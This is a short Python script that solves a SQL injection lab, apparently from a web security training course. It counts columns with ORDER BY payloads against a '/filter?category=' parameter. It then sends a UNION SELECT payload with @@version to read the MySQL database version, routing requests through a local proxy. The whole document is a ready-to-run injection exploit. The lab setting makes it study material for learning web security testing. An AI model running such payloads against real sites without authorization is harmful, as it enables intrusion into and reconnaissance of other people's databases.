#Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

import requests
import sys 
import urllib3

#Disable warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Making request go through the proxy for debugging
proxy = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}


#Checking the number of columns since this is a UNION SQL injection
def count_columns(url):
    uri = "/filter?category=Gifts"
    for i in range(1,21):
        payload = f"'ORDER BY {i}%23"
        column_num_request = requests.get(url + uri + payload, verify=False, proxies=proxy)
        if "Internal Server Error" in column_num_request.text:
            return i - 1

#Exploit Function
def successfully_exploited(url):
    uri = "/filter?category=Gifts"
    middle_part = " null," * (count_columns(url)-1)
    payload = "'UNION SELECT" + middle_part + "@@version%23"
    request = requests.get(url + uri + payload, verify=False, proxies=proxy)
    ##checking for text that should only exist if the exploit is successful
    if "ubuntu" in request.text:
        return True
    else:
        return False

if __name__ == "__main__":
    #Making sure the user provides the url
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        sys.exit(-1)

    if successfully_exploited(url):
        print("successful")
    else:
        print("Something went wrong")